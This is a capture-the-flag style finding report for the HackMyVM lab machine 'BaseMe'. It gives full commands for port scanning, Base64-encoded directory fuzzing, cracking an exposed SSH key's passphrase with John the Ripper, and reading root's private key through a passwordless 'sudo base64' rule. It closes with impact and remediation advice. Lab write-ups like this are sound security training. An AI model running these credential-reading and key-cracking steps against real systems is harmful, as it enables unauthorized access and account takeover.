@@ -1,0 +1,153 @@
+📑 Finding Report: Hidden SSH Key and User Access
+ Machine: BaseMe – HackMyVM
+🟢 Executive Summary
+ Severity: Easy
+ Description:
+ Initial reconnaissance revealed a web page suggesting that all required data was encoded in Base64, including credentials. By fuzzing Base64-encoded directories, two critical files were discovered: robots.txt and an id_rsa private key. Decoding and using the key granted SSH access as user lucas. This allowed retrieval of the user flag, though no privilege escalation path to root was discovered within the analyzed scope. However, privilege escalation was later achieved by exploiting the ability to run the base64 command as root, allowing access to the root private SSH key and full root access.
+🖥️ Scope and Environment
+ Platform: HackMyVM
+ Machine: BaseMe (Linux – Easy)
+ Assigned IP: 192.168.1.133
+ Date of Analysis: 21/04/2025
+🛠 Tools Used
+nmap
+
+
+gobuster
+
+
+base64
+
+
+curl
+
+
+ssh
+
+
+Web browser
+
+
+chmod, ssh-keygen
+
+
+🔍 Finding Description
+4.1 Port Scanning
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.133  
+nmap -sCV -p22,80 192.168.1.133  
+
+
+Open Ports:
+22/tcp → OpenSSH 7.9p1
+
+
+80/tcp → nginx 1.14.2
+
+
+4.2 Web Enumeration
+ Accessing port 80 revealed a Base64 message:
+ALL, absolutely ALL that you need is in BASE64.  
+Including the password that you need :)  
+Remember, BASE64 has the answer to all your questions.  
+-lucas
+
+4.3 Directory Fuzzing (Base64 encoded)
+ Used a base64-encoded wordlist to fuzz directories:
+while read line; do echo "$line" | base64 >> wordlistcodificada64.txt; done < /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  
+gobuster dir -u http://192.168.1.133/ -w wordlistcodificada64.txt -x html,php,txt -t 100  
+
+Found:
+/aWRfcnNhCg== → id_rsa
+
+
+/cm9ib3RzLnR4dAo= → robots.txt
+
+
+
+4.4 SSH Key Extraction and Login
+ Downloaded and decoded id_rsa:
+base64 -d > id_rsa  
+chmod 600 id_rsa  
+ssh -i id_rsa lucas@192.168.1.133  
+
+Access was granted as user lucas.
+4.5 Escalate User lucas
+ Crackeo id_rsa using John the Ripper:
+ Inspecting the main page revealed a list of possible passwords in the HTML source code:
+<!--
+iloveyou
+youloveyou
+shelovesyou
+helovesyou
+weloveyou
+theyhatesme
+-->
+
+These words were Base64 encoded and tested against the private key.
+ First, created the hash using ssh2john:
+ssh2john id_rsa > hash.id_rsa  
+
+Next, encoded the list of words in Base64 and used john to crack the password:
+while read line; do echo "$line" | base64 >> pass_code.txt; done < pass.txt  
+john --wordlist=pass_code.txt hash.id_rsa  
+John the Ripper output:
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+aWxvdmV5b3UK     (id_rsa)
+1g 0:00:00:00 DONE (2025-04-21 03:40) 2.564g/s 15.38p/s 15.38c/s 15.38C/s aWxvdmV5b3UK..dGhleWhhdGVzbWUK
+
+Password cracked successfully. The password aWxvdmV5b3UK was used to authenticate via SSH:
+ssh -i id_rsa lucas@<IP>  
+
+This granted access as user lucas, and the user flag (user.txt) was retrieved.
+
+
+4.6 Privilege Escalation
+ Escalating Privileges:
+ Running sudo -l revealed that the user lucas could execute base64 as root without a password. This allowed reading system files that were otherwise inaccessible. By decoding the private SSH key for root (/root/.ssh/id_rsa), access as root was obtained.
+LFILE=/root/.ssh/id_rsa  
+sudo base64 "$LFILE" | base64 --decode  
+
+Decoded content revealed the root SSH private key, which was saved and used to gain root access:
+nano id_rsa  
+chmod 600 id_rsa  
+ssh -i id_rsa root@192.168.1.133  
+
+With root access, the root flag was retrieved:
+root.txt
+
+🔐 Impact
+ Severity: Critical. This chain of vulnerabilities allowed:
+Unauthorized remote access via SSH: The id_rsa file was found publicly accessible, allowing SSH access to the machine as user lucas.
+
+
+Credential discovery through social engineering: The password for user lucas was discovered via a wordlist on the webpage and a brute-force attack on the SSH key.
+
+
+Local privilege escalation to root: User lucas had permissions to run the base64 command as root without restriction, which allowed reading the root SSH private key and gaining full system access.
+
+
+Complete system compromise: Root access was obtained via the root SSH key, allowing access to the root flag and complete system compromise.
+
+
+🛡 Recommendations
+Restrict access to sensitive files: Ensure private keys like id_rsa are not exposed in publicly accessible directories.
+
+
+Review and strengthen SSH configurations: Ensure SSH keys are properly protected, and unauthorized access via private keys is restricted.
+
+
+Implement strong password policies and password management: Avoid using predictable passwords and enforce policies for strong, unique passwords.
+
+
+Audit command execution permissions: Limit the commands users can run with elevated privileges (sudo), and review user permissions to prevent unauthorized root command execution.
+
+
+Monitor and log authentication activities: Set up monitoring for SSH login attempts and possible brute-force attack attempts.
+
+
+Review and limit the use of base64 and other decoding commands in critical systems: Ensure tools like base64 are not executable by unprivileged users, as they can be used to bypass security controls and access sensitive data.
